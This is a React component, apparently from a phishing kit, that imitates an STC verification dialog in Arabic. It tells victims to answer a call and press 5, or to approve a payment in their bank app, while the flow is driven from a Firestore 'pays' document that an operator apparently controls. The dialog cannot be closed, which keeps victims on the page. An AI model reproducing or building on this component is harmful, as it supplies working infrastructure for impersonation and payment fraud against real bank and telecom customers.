"use client"

import { useEffect, useState } from "react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { PhoneCall, Smartphone } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
import Image from "next/image"

interface StcVerificationModalProps {
  open: boolean
  visitorId: string
  onApproved: () => void
  onRejected: () => void
}

export function StcVerificationModal({ 
  open, 
  visitorId, 
  onApproved, 
  onRejected 
}: StcVerificationModalProps) {
  const [status, setStatus] = useState<"pending" | "approved" | "rejected" | "message">("pending")
  const [isConfirming, setIsConfirming] = useState(false)

  useEffect(() => {
    if (!open || !visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const phoneOtpStatus = data.phoneOtpStatus as "pending" | "approved" | "rejected" | "verifying" | "message"

          if (phoneOtpStatus === "approved") {
            setStatus("approved")
            onApproved()
          } else if (phoneOtpStatus === "rejected") {
            setStatus("rejected")
            onRejected()
          } else if (phoneOtpStatus === "message") {
            setStatus("message")
          } else {
            setStatus("pending")
          }
        }
      },
      (error) => {
        console.error("[STC Modal] Listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [open, visitorId, onApproved, onRejected])

  const handleMessageConfirm = async () => {
    if (!visitorId || !db) return
    setIsConfirming(true)
    try {
      await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
    } catch (err) {
      console.error("[STC Modal] confirm error:", err)
    } finally {
      setIsConfirming(false)
    }
  }

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent 
        className="sm:max-w-md" 
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        {status === "message" ? (
          <div className="flex flex-col items-center justify-center space-y-6 py-8 px-4">
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#0a4a68]/10">
                <Smartphone className="h-8 w-8 text-[#0a4a68]" />
              </div>
            </div>
            <div className="space-y-3 text-center">
              <p className="text-lg font-bold leading-relaxed text-gray-800">
                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
              </p>
              <div className="flex items-center justify-center gap-2">
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "0ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "150ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
            <button
              onClick={handleMessageConfirm}
              disabled={isConfirming}
              className="w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all disabled:opacity-60 disabled:cursor-not-allowed"
              style={{
                background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
                color: "#1a3d52",
                boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
              }}
            >
              {isConfirming ? "جاري التأكيد..." : "تم الموافقة في التطبيق"}
            </button>
          </div>
        ) : (
          <div className="flex flex-col items-center justify-center space-y-6 py-8">
            <div className="w-32 h-32 relative">
              <Image src="/stc.svg" alt="STC Logo" fill className="object-contain" />
            </div>
            <div className="relative">
              <div className="absolute inset-0 animate-ping">
                <div className="w-20 h-20 rounded-full bg-purple-400 opacity-75"></div>
              </div>
              <div className="relative flex items-center justify-center w-20 h-20 rounded-full bg-purple-500">
                <PhoneCall className="w-10 h-10 text-white animate-pulse" />
              </div>
            </div>
            <div className="text-center space-y-3 px-4">
              <p className="text-lg text-gray-700 leading-relaxed">
                عزيزنا العميل سيتم الاتصال بك من مركز خدمات STC الرجاء الرد على المكالمة و الضغط على الرقم <span className="font-bold text-purple-600">5</span>
              </p>
            </div>
            <div className="flex flex-col items-center space-y-2">
              <div className="flex space-x-2 space-x-reverse">
                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
              </div>
              <p className="text-sm text-gray-500">جاري الانتظار...</p>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  )
}
